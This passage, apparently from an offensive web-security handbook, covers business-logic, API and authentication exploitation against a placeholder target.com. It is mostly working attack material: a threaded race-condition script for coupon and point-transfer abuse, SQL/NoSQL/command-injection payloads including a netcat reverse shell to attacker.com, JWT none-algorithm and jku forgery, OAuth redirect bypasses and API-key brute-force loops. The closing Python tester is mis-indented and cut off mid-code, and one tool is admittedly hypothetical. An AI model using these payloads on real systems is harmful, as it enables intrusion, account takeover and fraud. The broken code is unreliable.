```python
import requests
import threading
import time

class RaceConditionTester:
    def __init__(self, url, num_threads=50):
        self.url = url
        self.num_threads = num_threads
        self.results = []
        
    def send_request(self, data):
        try:
            response = requests.post(self.url, json=data, timeout=5)
            self.results.append({
                "status": response.status_code,
                "data": response.json()
            })
        except Exception as e:
            self.results.append({"error": str(e)})
    
    def test_race(self, payload):
        self.results = []
        threads = []
        
        # Create threads
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.send_request, args=(payload,))
            threads.append(thread)
        
        # Start all threads simultaneously
        for thread in threads:
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Analyze results
        successful = sum(1 for r in self.results if r.get("status") == 200)
        print(f"Total requests: {self.num_threads}")
        print(f"Successful: {successful}")
        print(f"Success rate: {successful/self.num_threads*100:.2f}%")
        
        return self.results

# Usage examples
tester = RaceConditionTester("http://target.com/api/redeem-coupon", num_threads=100)

# Test coupon race condition
tester.test_race({
    "coupon_code": "ONETIME50",
    "cart_id": "cart_12345"
})

# Test inventory race condition
tester.test_race({
    "item_id": 789,
    "quantity": 1
})

# Test point transfer race
tester.test_race({
    "from_account": "account_A",
    "to_account": "account_B",
    "points": 1000
})
```

### Advanced Exploitation Scenarios

**Compound interest miscalculation:**

```http
POST /api/investment/calculate HTTP/1.1

{
  "principal": 1000,
  "rate": 0.05,
  "time": 1,
  "compound_frequency": -1
}
```

Negative compound frequency may cause:

- Division by zero
- Infinite loop
- Inverted calculation granting excessive returns

**Tax jurisdiction arbitrage:**

```http
POST /checkout HTTP/1.1

{
  "shipping_country": "US",
  "billing_country": "US",
  "tax_country": "MT"
}
```

If tax calculation uses separate country parameter, select jurisdiction with no sales tax.

**Subscription period boundary exploitation:**

```bash
# Subscribe on 2024-01-31
# Monthly subscription adds 1 month -> 2024-02-31 (invalid date)
# System may:
#   - Error out, granting free service
#   - Round to 2024-02-28, losing 3 days
#   - Round to 2024-03-01, gaining days

# Test subscription on dates: 29, 30, 31 of month
```

**Tiered pricing boundary manipulation:**

```http
POST /api/calculate-shipping HTTP/1.1

{
  "weight": 4.99,  # Just under 5kg tier
  "dimensions": {
    "length": 30,
    "width": 20,
    "height": 19.99  # Just under 20cm tier
  }
}
```

Test fractional values at tier boundaries:

- 4.999999kg
- 19.999999cm

May round down to lower tier.

**Promotional calendar exploitation:**

```bash
# Happy Hour: 5 PM - 6 PM (20% discount)
# Test requests at:
#   - 4:59:59 PM (before window)
#   - 5:00:00 PM (window start)
#   - 5:59:59 PM (window end)
#   - 6:00:00 PM (after window)

# With timezone manipulation:
curl -X POST http://target.com/api/order \
     -H "X-Client-Timezone: Pacific/Kiritimati" \
     -d '{"items": [...], "timestamp": "2024-10-16T17:00:00Z"}'
```

**Batch processing partial failure:**

```http
POST /api/batch-transfer HTTP/1.1

{
  "transfers": [
    {"to": "user1", "amount": 100},   # Valid
    {"to": "user2", "amount": 100},   # Valid
    {"to": "invalid", "amount": 100}, # Invalid - causes error
    {"to": "attacker", "amount": 500} # May not roll back
  ]
}
```

If batch isn't atomic, earlier transfers may complete despite later failures.

### Detection and Validation Techniques

**Parameter baseline mapping:**

```bash
# Capture legitimate transactions
# Document expected ranges for all calculation fields:
#   - Quantities: 1-10
#   - Prices: $0.99-$999.99
#   - Discounts: 0%-50%
#   - Weights: 0.1kg-30kg

# Test boundaries:
#   - Quantity: 0, -1, 11, 999999
#   - Price: 0, -1, 0.001, 9999999
#   - Discount: -10%, 100%, 999%
#   - Weight: 0, -1, 0.0001, 99999
```

**Response comparison analysis:**

```python
import requests

def compare_responses(base_request, modifications):
    """
    Send base request and modified versions
    Compare responses to identify calculation logic
    """
    base_response = requests.post(url, json=base_request)
    base_total = base_response.json().get("total")
    
    print(f"Base total: {base_total}")
    
    for mod_name, mod_data in modifications.items():
        modified_request = {**base_request, **mod_data}
        response = requests.post(url, json=modified_request)
        new_total = response.json().get("total")
        
        print(f"{mod_name}: {new_total} (diff: {new_total - base_total})")

# Usage
base = {"item": 123, "quantity": 1, "price": 100}
mods = {
    "negative_quantity": {"quantity": -1},
    "zero_price": {"price": 0},
    "fractional_quantity": {"quantity": 0.5},
    "large_quantity": {"quantity": 999999}
}
compare_responses(base, mods)
```

**Error message analysis:**

```bash
# Trigger calculation errors to extract logic information

# Division by zero
POST /api/split-payment
{"total": 100, "recipients": 0}

# Invalid type
POST /api/calculate
{"amount": "abc"}

# Null values
POST /api/total
{"subtotal": null, "tax": null}

# Error messages may reveal:
#   - Variable names
#   - Calculation formulas
#   - Database structure
#   - Validation logic
```

---

**Critical Related Topics:**

- **IDOR (Insecure Direct Object References)** in multi-step workflows
- **Mass Assignment vulnerabilities** enabling parameter manipulation
- **Time-of-check to Time-of-use (TOCTOU)** race conditions
- **API versioning exploits** (v1 vs v2 calculation differences)
- **WebSocket state manipulation** in real-time pricing systems

---

# API Exploitation

## RESTful API Basics

### API Architecture Fundamentals

**REST (Representational State Transfer) principles:**

- Stateless communication (no session state on server)
- Resource-based URLs (nouns, not verbs)
- Standard HTTP methods (GET, POST, PUT, DELETE, PATCH)
- JSON/XML data formats
- HATEOAS (Hypermedia as the Engine of Application State)

**Common API patterns:**

```
GET    /api/v1/users          - List all users
GET    /api/v1/users/123      - Get specific user
POST   /api/v1/users          - Create new user
PUT    /api/v1/users/123      - Update entire user
PATCH  /api/v1/users/123      - Partial update
DELETE /api/v1/users/123      - Delete user
```

### API Reconnaissance

**Discovering API endpoints:**

```bash
# Check robots.txt and sitemap
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml

# Common API paths
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger
/openapi.json
/api-docs
/docs
/wadl

# Automated discovery with ffuf
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,201,204,301,302,307,401,403,405

# API-specific wordlist
ffuf -u http://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Discover with Arjun (parameter discovery)
arjun -u http://target.com/api/endpoint
```

**API documentation discovery:**

```bash
# Swagger/OpenAPI documentation
curl http://target.com/swagger.json
curl http://target.com/swagger-ui.html
curl http://target.com/v2/api-docs
curl http://target.com/openapi.yaml
curl http://target.com/api/swagger.json

# WADL (Web Application Description Language)
curl http://target.com/application.wadl

# GraphQL introspection
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Postman collections (sometimes exposed)
curl http://target.com/collection.json
```

**Burp Suite API scanning:**

```bash
# Use Burp extensions:
# - Swagger Parser
# - OpenAPI Parser
# - GraphQL Raider
# - WSDL Wizard

# Passive scanning:
# 1. Browse application normally
# 2. Monitor Proxy history for API calls
# 3. Identify patterns in endpoints
# 4. Note authentication headers
```

### API Testing Methodology

**Information gathering:**

```bash
# Check HTTP methods allowed
curl -X OPTIONS http://target.com/api/v1/users -v

# Response headers reveal information
curl -I http://target.com/api/v1/users
# Look for: X-Powered-By, Server, X-API-Version, X-RateLimit-*

# Error messages expose internals
curl http://target.com/api/v1/users/invalid
# Check for stack traces, database errors, version info

# Test for verbose errors
curl http://target.com/api/v1/users -H "Accept: application/xml" -v
curl http://target.com/api/v1/users -H "Content-Type: application/xml" -d '<invalid></xml>' -v
```

**HTTP method testing:**

```bash
# Test all methods on endpoints
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
  echo "Testing $method"
  curl -X $method http://target.com/api/v1/resource/123 -v
done

# HEAD method information disclosure
curl -I http://target.com/api/v1/users/123
# May return data in headers

# TRACE method (HTTP verb tampering)
curl -X TRACE http://target.com/api/v1/admin -v
# May bypass access controls

# Method override headers
curl -X POST http://target.com/api/v1/users/123 \
  -H "X-HTTP-Method-Override: DELETE"
  
curl -X POST http://target.com/api/v1/users/123 \
  -H "X-Method-Override: PUT"
```

### Common API Vulnerabilities

**1. Broken Object Level Authorization (BOLA/IDOR):**

```bash
# Test access to other user's resources
# User A token accessing User B data

# Baseline request (legitimate)
curl http://target.com/api/v1/users/123/profile \
  -H "Authorization: Bearer USER_A_TOKEN"

# Test IDOR
curl http://target.com/api/v1/users/456/profile \
  -H "Authorization: Bearer USER_A_TOKEN"

# Try different ID formats
curl http://target.com/api/v1/users/user456/profile \
  -H "Authorization: Bearer USER_A_TOKEN"

# UUID enumeration
for uuid in $(cat uuid_list.txt); do
  curl http://target.com/api/v1/documents/$uuid \
    -H "Authorization: Bearer TOKEN" -s -o /dev/null -w "%{http_code} $uuid\n"
done

# Numeric ID enumeration with Burp Intruder
# Set position: /api/v1/users/Â§123Â§/profile
# Payload: Numbers 1-10000
# Grep-Match: Success indicators
```

**2. Broken Function Level Authorization:**

```bash
# Test admin endpoints with regular user token
curl http://target.com/api/v1/admin/users \
  -H "Authorization: Bearer REGULAR_USER_TOKEN"

# Try to access privileged functions
curl -X POST http://target.com/api/v1/users/456/promote \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"role":"admin"}'

# Test CRUD operations without proper authorization
# Create
curl -X POST http://target.com/api/v1/admin/settings \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"key":"value"}'

# Delete
curl -X DELETE http://target.com/api/v1/users/456 \
  -H "Authorization: Bearer USER_TOKEN"

# Common privileged endpoints to test
/api/v1/admin/*
/api/v1/internal/*
/api/v1/debug/*
/api/v1/*/delete
/api/v1/*/admin
/api/v1/settings/*
```

**3. Excessive Data Exposure:**

```bash
# API returns more data than necessary
curl http://target.com/api/v1/users/123 \
  -H "Authorization: Bearer TOKEN"

# Response may include:
{
  "id": 123,
  "username": "john",
  "email": "john@example.com",
  "password_hash": "$2y$10$...",  # Should not be exposed
  "ssn": "123-45-6789",            # PII leakage
  "api_key": "secret123",          # Credential exposure
  "internal_id": "INT-456"         # Internal information
}

# Test with different Accept headers
curl http://target.com/api/v1/users/123 \
  -H "Authorization: Bearer TOKEN" \
  -H "Accept: application/json"

curl http://target.com/api/v1/users/123 \
  -H "Authorization: Bearer TOKEN" \
  -H "Accept: application/xml"  # May expose different fields

# Generic search endpoints often leak data
curl http://target.com/api/v1/search?q= \
  -H "Authorization: Bearer TOKEN"
```

**4. Mass Assignment:**

```bash
# API doesn't filter which properties can be modified
# Normal update
curl -X PUT http://target.com/api/v1/users/123 \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"john","email":"john@example.com"}'

# Attempt to modify privileged fields
curl -X PUT http://target.com/api/v1/users/123 \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"john","role":"admin","is_verified":true}'

# Try common privileged fields
{
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "is_premium": true,
  "account_balance": 999999,
  "credits": 999999,
  "permissions": ["*"],
  "group": "admins",
  "user_type": "admin"
}

# Test during registration
curl -X POST http://target.com/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123","role":"admin"}'
```

**5. Injection Vulnerabilities:**

```bash
# SQL Injection
curl "http://target.com/api/v1/users?id=1' OR '1'='1" \
  -H "Authorization: Bearer TOKEN"

curl -X POST http://target.com/api/v1/search \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"test\" OR 1=1--"}'

# NoSQL Injection (MongoDB)
curl -X POST http://target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

curl -X POST http://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"role":"admin"}'

# Command Injection
curl -X POST http://target.com/api/v1/utils/ping \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; whoami"}'

curl -X POST http://target.com/api/v1/export \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename":"data.csv; nc attacker.com 4444 -e /bin/bash"}'

# LDAP Injection
curl "http://target.com/api/v1/ldap/search?user=*)(uid=*))(|(uid=*" \
  -H "Authorization: Bearer TOKEN"

# XPath Injection
curl "http://target.com/api/v1/xml/query?user=' or '1'='1" \
  -H "Authorization: Bearer TOKEN"
```

**6. Security Misconfiguration:**

```bash
# CORS misconfiguration
curl http://target.com/api/v1/users \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer TOKEN" -v

# Look for:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Origin: https://evil.com (reflected origin)
# Access-Control-Allow-Credentials: true

# Debug/verbose mode enabled
curl http://target.com/api/v1/endpoint?debug=true
curl http://target.com/api/v1/endpoint?verbose=1
curl http://target.com/api/v1/endpoint -H "X-Debug: true"

# Sensitive HTTP methods enabled
curl -X TRACE http://target.com/api/v1/endpoint -v
curl -X CONNECT http://target.com/api/v1/endpoint -v

# Error handling exposes stack traces
curl http://target.com/api/v1/error_prone_endpoint \
  -d '{"invalid":"json"'  # Malformed JSON

# Default credentials
curl http://target.com/api/v1/admin \
  -u "admin:admin"
curl http://target.com/api/v1/admin \
  -H "Authorization: Bearer default_token_123"
```

### API Enumeration Tools

**FFUF (Fuzz Faster U Fool):**

```bash
# Endpoint discovery
ffuf -u http://target.com/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,401,403 \
  -fw 1  # Filter by word count

# Parameter discovery
ffuf -u http://target.com/api/v1/users?FUZZ=test \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 \
  -fr "error"  # Filter regex

# ID enumeration
ffuf -u http://target.com/api/v1/users/FUZZ \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer TOKEN" \
  -mc 200 \
  -o results.json

# Method fuzzing
ffuf -u http://target.com/api/v1/admin \
  -w methods.txt \
  -X FUZZ \
  -mc all \
  -fc 404,405
```

**Kiterunner (API enumeration and scanning):**

```bash
# Installation
git clone https://github.com/assetnote/kiterunner
cd kiterunner
make build

# Scan with wordlist
kr scan http://target.com -w routes-large.kite -x 20

# Scan specific API version
kr scan http://target.com/api/v1 -w routes-large.kite

# Brute force mode
kr brute http://target.com -w routes.kite -A=apiroutes-210228:20000

# With authentication
kr scan http://target.com -w routes.kite \
  -H "Authorization: Bearer TOKEN"

# Output formats
kr scan http://target.com -w routes.kite -o json > results.json
```

**Postman/Newman:**

```bash
# Install Newman (Postman CLI)
npm install -g newman

# Run collection against target
newman run collection.json -e environment.json

# Run with specific iterations
newman run collection.json --iteration-count 10

# Export results
newman run collection.json -r cli,json --reporter-json-export results.json

# Run with dynamic variables
newman run collection.json --env-var "api_token=TOKEN"
```

**Custom Python scanner:**

```python
#!/usr/bin/env python3
# api_scanner.py
import requests
import json
from concurrent.futures import ThreadPoolExecutor

class APIScanner:
    def __init__(self, base_url, token=None):
        self.base_url = base_url
        self.headers = {}
        if token:
            self.headers['Authorization'] = f'Bearer {token}'
    
    def test_endpoint(self, endpoint, method='GET', data=None):
        url = f"{self.base_url}{endpoint}"
        try:
            if method == 'GET':
                resp = requests.get(url, headers=self.headers, timeout=5)
            elif method == 'POST':
                resp = requests.post(url, headers=self.headers, json=data, timeout=5)
            elif method == 'PUT':
                resp = requests.put(url, headers=self.headers, json=data, timeout=5)
            elif method == 'DELETE':
                resp = requests.delete(url, headers=self.headers, timeout=5)
            
            return {
                'endpoint': endpoint,
                'method': method,
                'status': resp.status_code,
                'length': len(resp.content),
                'headers': dict(resp.headers)
            }
        except Exception as e:
            return {'endpoint': endpoint, 'error': str(e)}
    
    def enumerate_ids(self, endpoint_template, start=1, end=100):
        results = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for i in range(start, end):
                endpoint = endpoint_template.replace('{id}', str(i))
                futures.append(executor.submit(self.test_endpoint, endpoint))
            
            for future in futures:
                result = future.result()
                if result.get('status') == 200:
                    results.append(result)
                    print(f"[+] Found: {result['endpoint']} - {result['status']}")
        
        return results

if __name__ == "__main__":
    scanner = APIScanner("http://target.com/api/v1", token="YOUR_TOKEN")
    
    # Test endpoints
    endpoints = ['/users', '/admin', '/settings', '/profile']
    for ep in endpoints:
        result = scanner.test_endpoint(ep)
        print(json.dumps(result, indent=2))
    
    # Enumerate user IDs
    scanner.enumerate_ids('/users/{id}', 1, 1000)
```

---

## API Authentication Weaknesses

### Authentication Methods

**1. API Keys:**

```bash
# Header-based
curl http://target.com/api/v1/data \
  -H "X-API-Key: abc123xyz"
curl http://target.com/api/v1/data \
  -H "API-Key: abc123xyz"

# Query parameter
curl "http://target.com/api/v1/data?api_key=abc123xyz"

# Custom header
curl http://target.com/api/v1/data \
  -H "X-Auth-Token: abc123xyz"
```

**2. Bearer Tokens (JWT):**

```bash
# Standard Authorization header
curl http://target.com/api/v1/data \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Alternative headers
curl http://target.com/api/v1/data \
  -H "X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**3. OAuth 2.0:**

```bash
# Access token in header
curl http://target.com/api/v1/data \
  -H "Authorization: Bearer ACCESS_TOKEN"

# Token in query parameter (less secure)
curl "http://target.com/api/v1/data?access_token=ACCESS_TOKEN"
```

**4. Basic Authentication:**

```bash
# Username:Password encoded in Base64
curl http://target.com/api/v1/data \
  -H "Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ="

# Using curl's -u flag
curl -u username:password http://target.com/api/v1/data
```

**5. HMAC Signatures:**

```bash
# Request signed with shared secret
# Format varies by implementation
curl http://target.com/api/v1/data \
  -H "X-Signature: sha256=abc123..." \
  -H "X-Timestamp: 1634567890"
```

### Common Authentication Vulnerabilities

**1. Weak/Predictable API Keys:**

```bash
# Test for weak key generation
# Sequential keys
curl http://target.com/api/v1/data -H "X-API-Key: key_000001"
curl http://target.com/api/v1/data -H "X-API-Key: key_000002"

# Timestamp-based keys
curl http://target.com/api/v1/data -H "X-API-Key: $(date +%s)"

# Short keys (brute forceable)
for i in {0000..9999}; do
  curl http://target.com/api/v1/data -H "X-API-Key: $i" -s -o /dev/null -w "%{http_code} $i\n"
done

# Pattern-based keys
curl http://target.com/api/v1/data -H "X-API-Key: api_test_12345"
curl http://target.com/api/v1/data -H "X-API-Key: sk_test_12345"
curl http://target.com/api/v1/data -H "X-API-Key: pk_test_12345"
```

**2. JWT Vulnerabilities:**

**None algorithm attack:**

```bash
# Decode JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature" | cut -d'.' -f1 | base64 -d

# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}

# Create new JWT with "none" algorithm
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '+/' '-_'
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr -d '=' | tr '+/' '-_'
# Output: eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ

# Combine with empty signature
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."

curl http://target.com/api/v1/admin \
  -H "Authorization: Bearer $TOKEN"
```

**Weak secret brute-forcing:**

```bash
# Using jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Crack JWT secret
python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
# Extract signature for cracking
python3 jwt_tool.py JWT_TOKEN -X i  # Show info
# Create hashcat format: <jwt>
echo "JWT_TOKEN" > jwt.txt

hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show

# Using john
jwt2john JWT_TOKEN > jwt.hash
john jwt.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Key confusion (RS256 to HS256):**

```bash
# If server uses RS256 (asymmetric) but doesn't validate algorithm
# Attacker can switch to HS256 (symmetric) using public key as secret

# 1. Get public key
curl http://target.com/.well-known/jwks.json

# 2. Convert public key to format suitable for HMAC
# [Inference] Requires manual key manipulation

# 3. Create JWT signed with HS256 using public key
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# 4. Test modified token
curl http://target.com/api/v1/admin \
  -H "Authorization: Bearer MODIFIED_TOKEN"
```

**JWT parameter injection:**

```bash
# jku (JWK Set URL) injection
# Header: {"alg":"RS256","jku":"https://attacker.com/jwks.json"}

# Host malicious JWKS
cat > jwks.json <<EOF
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker_key",
      "use": "sig",
      "n": "YOUR_PUBLIC_KEY_N",
      "e": "AQAB"
    }
  ]
}
EOF

python3 -m http.server 80  # Serve jwks.json

# Create JWT with jku parameter pointing to attacker server
python3 jwt_tool.py JWT_TOKEN -I -hc jku -hv "http://attacker.com/jwks.json" -S rs256 -pr private_key.pem

# x5u (X.509 URL) injection - similar concept
# x5c (X.509 Certificate Chain) injection

# kid (Key ID) injection - path traversal
# Header: {"alg":"HS256","kid":"../../public_key"}
python3 jwt_tool.py JWT_TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# Signs with empty key from /dev/null
```

**JWT claims manipulation:**

```bash
# Decode and modify claims
jwt_decode() {
    echo "$1" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
}

# Extract and decode
PAYLOAD=$(echo "JWT_TOKEN" | cut -d'.' -f2)
echo "$PAYLOAD" | base64 -d | jq

# Modify claims
echo '{"user":"admin","role":"admin","exp":9999999999}' | base64 -w0 | tr -d '=' | tr '+/' '-_'

# Common claims to manipulate:
# - sub (subject): User identifier
# - role/roles: User roles
# - admin/is_admin: Admin flag
# - exp: Expiration time
# - iat: Issued at
# - permissions: Permission array

# Use jwt_tool for automated manipulation
python3 jwt_tool.py JWT_TOKEN -T  # Tamper with claims
```

**3. OAuth/OAuth2 Vulnerabilities:**

**Open redirect in redirect_uri:**

```bash
# Authorization request with malicious redirect
curl "http://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://attacker.com&response_type=code"

# Bypass redirect_uri validation
# Subdomain hijacking
redirect_uri=https://evil.target.com

# Path traversal
redirect_uri=https://target.com@attacker.com
redirect_uri=https://attacker.com%2f%2ftarget.com
redirect_uri=https://target.com/callback/../../../attacker.com

# Open redirect on target domain
redirect_uri=https://target.com/redirect?url=https://attacker.com
```

**State parameter manipulation:**

```bash
# CSRF on OAuth flow - missing or weak state parameter

# Legitimate flow
curl "http://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/callback&state=random_state&response_type=code"

# Attack: Remove state parameter
curl "http://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/callback&response_type=code"

# Or use predictable state
curl "http://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://target.com/callback&state=123&response_type=code"
```

**Client secret exposure:**

```bash
# Search for exposed secrets in:
# - Mobile apps (decompile APK/IPA)
# - JavaScript files
# - Git repositories
# - Public pastebins

# GitHub dorking
site:github.com "client_secret" "target.com"
site:github.com "api_key" "target.com"
site:github.com "oauth" "target.com"

# JavaScript analysis
curl http://target.com/static/js/app.js | grep -E "client_secret|api_key|bearer"

# Use found secret to get access token
curl -X POST http://target.com/oauth/token \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=FOUND_SECRET" \
  -d "grant_type=client_credentials"
```

**4. Session/Token Fixation:**

```bash
# Attacker sets victim's session token

# Obtain token
curl http://target.com/api/v1/auth/init

# Response: {"token":"abc123xyz"}

# Send to victim
https://target.com/?token=abc123xyz

# Victim authenticates with fixed token
# Attacker can use token to access victim's session

curl http://target.com/api/v1/data \
  -H "Authorization: Bearer abc123xyz"
```

**5. Token Disclosure:**

**Referer header leakage:**

```bash
# Token in URL leaked via Referer
# User visits: http://target.com/api/data?token=SECRET
# Then clicks external link
# Request to external site includes: Referer: http://target.com/api/data?token=SECRET

# Test for token in URL
curl -v "http://target.com/api/v1/data?access_token=TEST_TOKEN"
# If 200 OK, tokens in URL are accepted (security issue)

# Proper method (header-based)
curl http://target.com/api/v1/data \
  -H "Authorization: Bearer TEST_TOKEN"
```

**Browser history/cache leakage:**

```bash
# Tokens stored in browser history if in URL
# Tokens cached if Cache-Control headers missing

# Check cache headers
curl -I http://target.com/api/v1/sensitive

# Should include:
# Cache-Control: no-store, no-cache, must-revalidate
# Pragma: no-cache
```

**Log file disclosure:**

```bash
# Tokens logged in server access logs if in URL
# Example access.log entry:
# 192.168.1.100 - - [date] "GET /api/data?token=SECRET HTTP/1.1" 200

# Test if logs accessible
curl http://target.com/logs/access.log
curl http://target.com/server-status
curl http://target.com/admin/logs
```

### Authentication Testing Tools

**Burp Suite Professional - Active Scanner:**

```bash
# Built-in checks for:
# - JWT vulnerabilities
# - Session token weaknesses
# - OAuth flaws
# - API key issues

# Manual testing in Repeater:
# 1. Send authenticated request to Repeater
# 2. Remove/modify authentication headers
# 3. Test different auth methods
# 4. Analyze responses
```

**JWT_Tool comprehensive testing:**

```bash
# Clone repository
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Scan JWT for vulnerabilities
python3 jwt_tool.py JWT_TOKEN -M at -t "http://target.com/api/v1/verify"

# Specific attacks:
# None algorithm
python3 jwt_tool.py JWT_TOKEN -X n

# Blank password
python3 jwt_tool.py JWT_TOKEN -X b

# Key confusion
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Inject new claims
python3 jwt_tool.py JWT_TOKEN -I -pc role -pv admin

# Sign with custom secret
python3 jwt_tool.py JWT_TOKEN -S hs256 -p "secret"

# Full automated scan
python3 jwt_tool.py JWT_TOKEN -t http://target.com/api/v1/endpoint -M at -cv "Welcome admin"
```

**Authz0 (Authorization testing framework):**

```bash
# [Unverified tool - using as example]
# Hypothetical usage pattern for authorization testing

# Test multiple users against endpoints
authz0 -u users.json -e endpoints.json -o results.html

# users.json format:
{
  "users": [
    {"name": "admin", "token": "ADMIN_TOKEN"},
    {"name": "user", "token": "USER_TOKEN"},
    {"name": "guest", "token": "GUEST_TOKEN"}
  ]
}

# endpoints.json format:
{
  "endpoints": [
    {"method": "GET", "path": "/api/v1/admin/users"},
    {"method": "DELETE", "path": "/api/v1/users/123"}
  ]
}
```

**Custom authentication tester:**

```python
#!/usr/bin/env python3
# auth_tester.py
import requests
import jwt
import json
from base64 import urlsafe_b64encode, urlsafe_b64decode

class AuthTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.tokens = {}
    
    def test_no_auth(self, endpoint):
	    """Test endpoint without authentication""" 
	    url = f"{self.base_url}{endpoint}" 
	    resp = requests.get(url) 
	    return { 
		    'test': 'no_auth', 
		    'endpoint': endpoint, 
		    'status': resp.status_code, 
		    'accessible': resp.status_code not in [401, 403]
		}

def test_expired_token(self, endpoint, token):
    """Test with expired token"""
    url = f"{self.base_url}{endpoint}"
    resp = requests.get(url, headers={'Authorization': f'Bearer {token}'})
    return {
        'test': 'expired_token',
        'status': resp.status_code,
        'vulnerable': resp.status_code == 200
    }

def test_modified_token(self, endpoint, token, modifications):
    """Test JWT with modified claims"""
    try:
        # Decode without verification
        parts = token.split('.')
        header = json.loads(urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(urlsafe_b64decode(parts[1] + '=='))
        
        # Apply modifications
        for key, value in modifications.items():
            payload[key] = value
        
        # Encode (without signing - testing for lack of verification)
        new_header = urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        new_payload = urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        modified_token = f"{new_header}.{new_payload}."
        
        url = f"{self.base_url}{endpoint}"
        resp = requests.get(url, headers={'Authorization': f'Bearer {modified_token}'})
        
        return {
            'test': 'modified_token',
            'modifications': modifications,
            'status': resp.status_code,
            'vulnerable': resp.status_code == 200
        }
    except Exception as e:
        return {'test': 'modified_token', 'error': str(e)}

def test_token_reuse(self, endpoint, token, other_user_endpoint):
    """Test if token can be reused for other users"""
    url = f"{self.base_url}{other_user_endpoint}"
    resp = requests.get(url, headers={'Authorization': f'Bearer {token}'})
    return {
        'test': 'token_reuse',
        'original_endpoint': endpoint,
        'tested_endpoint': other_user_endpoint,
        'status': resp.status_code,
        'vulnerable': resp.status_code == 200
    }

def test_jwt_algorithms(self, endpoint, token):
    """Test various JWT algorithm attacks"""
    results = []
    
    # Test 1: None algorithm
    try:
        parts = token.split('.')
        header = json.loads(urlsafe_b64decode(parts[0] + '=='))
        header['alg'] = 'none'
        payload = urlsafe_b64decode(parts[1] + '==')
        
        new_header = urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        new_payload = urlsafe_b64encode(payload).decode().rstrip('=')
        none_token = f"{new_header}.{new_payload}."
        
        url = f"{self.base_url}{endpoint}"
        resp = requests.get(url, headers={'Authorization': f'Bearer {none_token}'})
        results.append({
            'attack': 'none_algorithm',
            'status': resp.status_code,
            'vulnerable': resp.status_code == 200
        })
    except Exception as e:
        results.append({'attack': 'none_algorithm', 'error': str(e)})
    
    # Test 2: Blank signature
    blank_token = '.'.join(token.split('.')[:-1]) + '.'
    resp = requests.get(f"{self.base_url}{endpoint}", 
                      headers={'Authorization': f'Bearer {blank_token}'})
    results.append({
        'attack': 'blank_signature',
        'status': resp.status_code,
        'vulnerable': resp.status_code == 200
    })
    
    return results

def run_full_test(self, endpoints, valid_token):
    """Run comprehensive authentication tests"""
    all_results = []
    
    for endpoint in endpoints:
        print(f"[*] Testing {endpoint}")
        
        # Test 1: No authentication
        result = self.test_no_auth(endpoint)
        all_results.append(result)
        if result['accessible']:
